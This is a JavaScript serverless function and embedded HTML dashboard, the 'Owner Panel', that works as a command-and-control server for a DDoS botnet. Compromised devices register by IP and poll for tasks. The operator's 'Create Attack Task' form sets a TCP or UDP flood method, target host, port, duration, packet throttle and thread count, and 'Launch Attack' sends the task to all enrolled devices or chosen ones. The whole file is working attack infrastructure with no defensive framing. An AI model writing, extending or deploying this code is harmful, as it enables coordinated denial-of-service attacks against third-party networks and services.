// Vercel Serverless Function - Owner Panel API + Dashboard
// All endpoints work, no manual routing issues

const devices = new Map();
const tasks = [];
let taskIdCounter = 0;
let deviceIdCounter = 0;

module.exports = async (req, res) => {
    const url = req.url;
    const method = req.method;
    
    // Parse query parameters
    const urlObj = new URL(url, `http://${req.headers.host}`);
    const queryParams = urlObj.searchParams;
    
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Helper to get client IP
    const getClientIP = () => {
        return queryParams.get('add') || 
               req.headers['x-forwarded-for']?.split(',')[0] || 
               req.socket.remoteAddress || 
               'unknown';
    };
    
    // ============================================================
    // ENDPOINT 1: Device Registration - GET /api/v1/device?add=IP
    // ============================================================
    if (url.startsWith('/api/v1/device') && method === 'GET') {
        const deviceIP = getClientIP();
        
        // Check if device exists
        let existingId = null;
        let existingDevice = null;
        for (const [id, device] of devices) {
            if (device.ip === deviceIP) {
                existingId = id;
                existingDevice = device;
                break;
            }
        }
        
        if (existingDevice) {
            existingDevice.last_seen = new Date().toISOString();
            existingDevice.status = 'online';
            devices.set(existingId, existingDevice);
            return res.json({ 
                success: true, 
                message: 'Device already registered',
                device_id: existingId 
            });
        }
        
        // Register new device
        deviceIdCounter++;
        const newDevice = {
            id: deviceIdCounter,
            ip: deviceIP,
            status: 'online',
            first_seen: new Date().toISOString(),
            last_seen: new Date().toISOString(),
            tasks_completed: 0,
            tasks_failed: 0
        };
        devices.set(deviceIdCounter, newDevice);
        
        return res.json({ 
            success: true, 
            message: 'Device registered',
            device_id: deviceIdCounter 
        });
    }
    
    // ============================================================
    // ENDPOINT 2: Task Polling - GET /v1/task
    // ============================================================
    if (url.startsWith('/v1/task') && method === 'GET') {
        const deviceIP = getClientIP();
        
        // Update device last_seen
        let deviceId = null;
        for (const [id, device] of devices) {
            if (device.ip === deviceIP) {
                device.last_seen = new Date().toISOString();
                device.status = 'online';
                devices.set(id, device);
                deviceId = id;
                break;
            }
        }
        
        // Get pending tasks for this device
        const deviceTasks = tasks.filter(task => 
            task.status === 'pending' && 
            (task.device_ids === 'all' || 
             (Array.isArray(task.device_ids) && task.device_ids.includes(deviceId)))
        );
        
        // Mark as in_progress
        deviceTasks.forEach(task => {
            task.status = 'in_progress';
            task.assigned_to = deviceIP;
            task.assigned_at = new Date().toISOString();
        });
        
        // Format response
        const formattedTasks = deviceTasks.map(task => ({
            task_id: task.task_id,
            method: task.method,
            target: task.target,
            port: task.port,
            time: task.time,
            throttle: task.throttle || 0,
            thread: task.threads || 0,
            ip: task.target
        }));
        
        return res.json(formattedTasks);
    }
    
    // ============================================================
    // ENDPOINT 3: Task Completion - POST /v1/task/complete
    // ============================================================
    if (url.startsWith('/v1/task/complete') && method === 'POST') {
        const { task_id, status, device_ip } = req.body;
        
        const task = tasks.find(t => t.task_id === task_id);
        if (task) {
            task.status = status || 'completed';
            task.completed_at = new Date().toISOString();
            
            // Update device stats
            for (const [id, device] of devices) {
                if (device.ip === device_ip) {
                    if (status === 'completed') {
                        device.tasks_completed++;
                    } else {
                        device.tasks_failed++;
                    }
                    devices.set(id, device);
                    break;
                }
            }
        }
        
        return res.json({ success: true });
    }
    
    // ============================================================
    // ENDPOINT 4: Get Devices List - GET /api/devices
    // ============================================================
    if (url.startsWith('/api/devices') && method === 'GET') {
        const deviceList = Array.from(devices.values()).map(device => ({
            ...device,
            last_seen: device.last_seen || 'never'
        }));
        
        const online = deviceList.filter(d => d.status === 'online').length;
        
        return res.json({
            devices: deviceList,
            total: deviceList.length,
            online: online,
            offline: deviceList.length - online
        });
    }
    
    // ============================================================
    // ENDPOINT 5: Get Tasks List - GET /api/tasks
    // ============================================================
    if (url.startsWith('/api/tasks') && method === 'GET') {
        const limit = parseInt(queryParams.get('limit')) || 50;
        const recentTasks = tasks.slice(-limit).reverse();
        
        return res.json({
            tasks: recentTasks,
            total: tasks.length,
            pending: tasks.filter(t => t.status === 'pending').length,
            in_progress: tasks.filter(t => t.status === 'in_progress').length,
            completed: tasks.filter(t => t.status === 'completed').length
        });
    }
    
    // ============================================================
    // ENDPOINT 6: Add Task - POST /api/tasks/add
    // ============================================================
    if (url.startsWith('/api/tasks/add') && method === 'POST') {
        const { method: taskMethod, target, port, time, throttle, threads, device_ids } = req.body;
        
        if (!taskMethod || !target || !port || !time) {
            return res.status(400).json({ error: 'Missing required parameters' });
        }
        
        taskIdCounter++;
        const taskId = `task_${Date.now()}_${taskIdCounter}`;
        
        const newTask = {
            task_id: taskId,
            method: taskMethod,
            target: target,
            port: parseInt(port),
            time: parseInt(time),
            throttle: throttle ? parseInt(throttle) : 0,
            threads: threads ? parseInt(threads) : 0,
            device_ids: device_ids || 'all',
            status: 'pending',
            created_at: new Date().toISOString(),
            assigned_to: null,
            assigned_at: null,
            completed_at: null
        };
        
        tasks.push(newTask);
        
        // Keep only last 1000 tasks
        if (tasks.length > 1000) {
            tasks.splice(0, tasks.length - 1000);
        }
        
        return res.json({ 
            success: true, 
            task_id: taskId,
            message: 'Task created successfully'
        });
    }
    
    // ============================================================
    // ENDPOINT 7: Statistics - GET /api/stats
    // ============================================================
    if (url.startsWith('/api/stats') && method === 'GET') {
        const totalDevices = devices.size;
        const onlineDevices = Array.from(devices.values()).filter(d => d.status === 'online').length;
        
        return res.json({
            devices: {
                total: totalDevices,
                online: onlineDevices,
                offline: totalDevices - onlineDevices
            },
            tasks: {
                total: tasks.length,
                completed: tasks.filter(t => t.status === 'completed').length,
                pending: tasks.filter(t => t.status === 'pending').length,
                in_progress: tasks.filter(t => t.status === 'in_progress').length
            },
            uptime: process.uptime()
        });
    }
    
    // ============================================================
    // ENDPOINT 8: Web Dashboard - GET /
    // ============================================================
    if (url === '/' || url === '') {
        res.setHeader('Content-Type', 'text/html');
        return res.send(getDashboardHTML());
    }
    
    // ============================================================
    // 404 - Not Found
    // ============================================================
    res.status(404).json({ 
        error: 'Not found',
        path: url,
        method: method,
        available_endpoints: [
            'GET /api/v1/device?add=YOUR_IP',
            'GET /v1/task',
            'POST /v1/task/complete',
            'GET /api/devices',
            'GET /api/tasks',
            'POST /api/tasks/add',
            'GET /api/stats',
            'GET /'
        ]
    });
};

// Dashboard HTML
function getDashboardHTML() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Owner Panel</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0a0a0a;color:#e5e5e5;line-height:1.6;}
        .container{max-width:1400px;margin:0 auto;padding:24px;}
        .header{background:linear-gradient(135deg,#0f0f0f 0%,#1a1a1a 100%);border-bottom:1px solid #2a2a2a;padding:20px 0;margin-bottom:32px;}
        .header h1{font-size:24px;font-weight:600;color:#fff;}
        .header p{color:#888;font-size:14px;margin-top:4px;}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:32px;}
        .stat-card{background:#111;border:1px solid #222;border-radius:12px;padding:20px;}
        .stat-label{font-size:13px;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:12px;}
        .stat-value{font-size:32px;font-weight:700;color:#fff;}
        .tabs{display:flex;gap:8px;border-bottom:1px solid #222;margin-bottom:24px;}
        .tab{padding:12px 24px;background:transparent;border:none;color:#888;cursor:pointer;font-size:14px;font-weight:500;border-bottom:2px solid transparent;}
        .tab:hover{color:#e5e5e5;}
        .tab.active{color:#fff;border-bottom-color:#fff;}
        .tab-content{display:none;}
        .tab-content.active{display:block;}
        .form-card{background:#111;border:1px solid #222;border-radius:12px;padding:24px;margin-bottom:32px;}
        .form-title{font-size:18px;font-weight:600;margin-bottom:20px;color:#fff;}
        .form-group{margin-bottom:16px;}
        .form-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;}
        label{display:block;font-size:13px;color:#888;margin-bottom:6px;}
        input,select{width:100%;padding:10px 12px;background:#1a1a1a;border:1px solid #333;border-radius:8px;color:#e5e5e5;font-size:14px;}
        input:focus,select:focus{outline:none;border-color:#666;}
        button{padding:10px 20px;background:#fff;color:#000;border:none;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;}
        button:hover{background:#e0e0e0;}
        .table-container{overflow-x:auto;background:#111;border:1px solid #222;border-radius:12px;}
        table{width:100%;border-collapse:collapse;}
        th{text-align:left;padding:14px 16px;background:#0d0d0d;font-size:13px;font-weight:600;color:#888;border-bottom:1px solid #222;}
        td{padding:12px 16px;font-size:14px;border-bottom:1px solid #1a1a1a;}
        tr:hover td{background:#161616;}
        .badge{display:inline-block;padding:4px 8px;border-radius:6px;font-size:12px;font-weight:500;}
        .badge-online{background:#10b98120;color:#10b981;border:1px solid #10b98130;}
        .badge-offline{background:#6b728020;color:#9ca3af;border:1px solid #6b728030;}
        .badge-pending{background:#f59e0b20;color:#f59e0b;border:1px solid #f59e0b30;}
        .badge-progress{background:#3b82f620;color:#3b82f6;border:1px solid #3b82f630;}
        .badge-completed{background:#10b98120;color:#10b981;border:1px solid #10b98130;}
        .alert{padding:12px 16px;border-radius:8px;margin-bottom:20px;font-size:14px;}
        .alert-success{background:#10b98120;border:1px solid #10b98130;color:#10b981;}
        .alert-error{background:#ef444420;border:1px solid #ef444430;color:#ef4444;}
        .hidden{display:none;}
        .loading{text-align:center;padding:40px;color:#666;}
        @media(max-width:768px){.container{padding:16px;}.stats-grid{grid-template-columns:repeat(2,1fr);gap:12px;}}
    </style>
</head>
<body>
    <div class="header"><div class="container"><h1>Owner Panel</h1><p>Control Center</p></div></div>
    <div class="container">
        <div id="alert" class="alert hidden"></div>
        <div class="stats-grid">
            <div class="stat-card"><div class="stat-label">Total Devices</div><div class="stat-value" id="totalDevices">-</div></div>
            <div class="stat-card"><div class="stat-label">Online Devices</div><div class="stat-value" id="onlineDevices">-</div></div>
            <div class="stat-card"><div class="stat-label">Offline Devices</div><div class="stat-value" id="offlineDevices">-</div></div>
            <div class="stat-card"><div class="stat-label">Total Tasks</div><div class="stat-value" id="totalTasks">-</div></div>
            <div class="stat-card"><div class="stat-label">Pending Tasks</div><div class="stat-value" id="pendingTasks">-</div></div>
            <div class="stat-card"><div class="stat-label">Completed Tasks</div><div class="stat-value" id="completedTasks">-</div></div>
        </div>
        <div class="tabs">
            <button class="tab active" onclick="showTab('attack')">New Attack</button>
            <button class="tab" onclick="showTab('devices')">Devices</button>
            <button class="tab" onclick="showTab('tasks')">Task History</button>
        </div>
        <div id="attackTab" class="tab-content active">
            <div class="form-card">
                <div class="form-title">Create Attack Task</div>
                <form id="attackForm">
                    <div class="form-row">
                        <div class="form-group"><label>Method</label><select id="method" required><option value="tcp">TCP</option><option value="udp">UDP</option></select></div>
                        <div class="form-group"><label>Target IP / Domain</label><input type="text" id="target" placeholder="192.168.1.1 or example.com" required></div>
                        <div class="form-group"><label>Port</label><input type="number" id="port" placeholder="80" required></div>
                    </div>
                    <div class="form-row">
                        <div class="form-group"><label>Duration (seconds)</label><input type="number" id="duration" placeholder="60" required></div>
                        <div class="form-group" id="throttleGroup"><label>Throttle (packets/sec)</label><input type="number" id="throttle" placeholder="1000"></div>
                        <div class="form-group" id="threadsGroup"><label>Threads</label><input type="number" id="threads" placeholder="4"></div>
                    </div>
                    <div class="form-group"><label>Target Devices (leave empty for all devices)</label><input type="text" id="deviceIds" placeholder="e.g., 1,2,3 or leave empty for all"></div>
                    <div class="form-group"><button type="submit">Launch Attack</button></div>
                </form>
            </div>
        </div>
        <div id="devicesTab" class="tab-content">
            <div class="table-container">
                <table><thead><tr><th>ID</th><th>IP Address</th><th>Status</th><th>Last Seen</th><th>Tasks Completed</th><th>Tasks Failed</th></tr></thead>
                <tbody id="devicesTableBody"><tr><td colspan="6" class="loading">Loading devices...</td></tr></tbody>
                </table>
            </div>
        </div>
        <div id="tasksTab" class="tab-content">
            <div class="table-container">
                <table><thead><tr><th>Task ID</th><th>Method</th><th>Target</th><th>Port</th><th>Status</th><th>Created At</th><th>Duration</th></tr></thead>
                <tbody id="tasksTableBody"><tr><td colspan="7" class="loading">Loading tasks...</td></tr></tbody>
                </table>
            </div>
        </div>
    </div>
    <script>
        function showTab(tabName){
            document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
            if(tabName==='attack'){document.querySelector('.tab').classList.add('active');document.getElementById('attackTab').classList.add('active');}
            else if(tabName==='devices'){document.querySelectorAll('.tab')[1].classList.add('active');document.getElementById('devicesTab').classList.add('active');loadDevices();}
            else if(tabName==='tasks'){document.querySelectorAll('.tab')[2].classList.add('active');document.getElementById('tasksTab').classList.add('active');loadTasks();}
        }
        function showAlert(msg,type){let a=document.getElementById('alert');a.textContent=msg;a.className='alert alert-'+type;a.classList.remove('hidden');setTimeout(()=>a.classList.add('hidden'),3000);}
        async function loadStats(){try{let r=await fetch('/api/stats');let s=await r.json();document.getElementById('totalDevices').textContent=s.devices.total;document.getElementById('onlineDevices').textContent=s.devices.online;document.getElementById('offlineDevices').textContent=s.devices.offline;document.getElementById('totalTasks').textContent=s.tasks.total;document.getElementById('pendingTasks').textContent=s.tasks.pending;document.getElementById('completedTasks').textContent=s.tasks.completed;}catch(e){}}
        async function loadDevices(){try{let r=await fetch('/api/devices');let d=await r.json();let tbody=document.getElementById('devicesTableBody');if(d.devices.length===0){tbody.innerHTML='<tr><td colspan="6" class="loading">No devices registered</td></tr>';return;}let html='';for(let dev of d.devices){html+='<tr><td>'+dev.id+'</td><td>'+dev.ip+'</td><td><span class="badge badge-'+(dev.status==='online'?'online':'offline')+'">'+dev.status+'</span></td><td>'+new Date(dev.last_seen).toLocaleString()+'</td><td>'+(dev.tasks_completed||0)+'</td><td>'+(dev.tasks_failed||0)+'</td></tr>';}tbody.innerHTML=html;}catch(e){document.getElementById('devicesTableBody').innerHTML='<tr><td colspan="6" class="loading">Error loading devices</td></tr>';}}
        async function loadTasks(){try{let r=await fetch('/api/tasks?limit=50');let d=await r.json();let tbody=document.getElementById('tasksTableBody');if(d.tasks.length===0){tbody.innerHTML='<tr><td colspan="7" class="loading">No tasks created</td></tr>';return;}let html='';for(let task of d.tasks){let sc='pending';if(task.status==='in_progress') sc='progress';if(task.status==='completed') sc='completed';html+='<tr><td>'+task.task_id+'</td><td><span style="text-transform:uppercase">'+task.method+'</span></td><td>'+task.target+'</td><td>'+task.port+'</td><td><span class="badge badge-'+sc+'">'+task.status+'</span></td><td>'+new Date(task.created_at).toLocaleString()+'</td><td>'+task.time+'s</td></tr>';}tbody.innerHTML=html;}catch(e){document.getElementById('tasksTableBody').innerHTML='<tr><td colspan="7" class="loading">Error loading tasks</td></tr>';}}
        document.getElementById('method').addEventListener('change',function(){let g1=document.getElementById('throttleGroup');let g2=document.getElementById('threadsGroup');if(this.value==='udp'){g1.style.display='block';g2.style.display='block';}else{g1.style.display='none';g2.style.display='none';}});
        document.getElementById('attackForm').addEventListener('submit',async function(e){e.preventDefault();let method=document.getElementById('method').value;let target=document.getElementById('target').value;let port=document.getElementById('port').value;let duration=document.getElementById('duration').value;let deviceIdsRaw=document.getElementById('deviceIds').value;let payload={method:method,target:target,port:port,time:duration,device_ids:deviceIdsRaw?deviceIdsRaw.split(',').map(id=>parseInt(id.trim())):'all'};if(method==='udp'){payload.throttle=document.getElementById('throttle').value||0;payload.threads=document.getElementById('threads').value||0;}try{let r=await fetch('/api/tasks/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});let res=await r.json();if(res.success){showAlert('Task created: '+res.task_id,'success');document.getElementById('attackForm').reset();loadStats();if(document.getElementById('tasksTab').classList.contains('active'))loadTasks();}else{showAlert(res.error||'Failed','error');}}catch(err){showAlert('Error: '+err.message,'error');}});
        document.getElementById('method').dispatchEvent(new Event('change'));
        loadStats();
        setInterval(loadStats,5000);
    </script>
</body>
</html>`;
}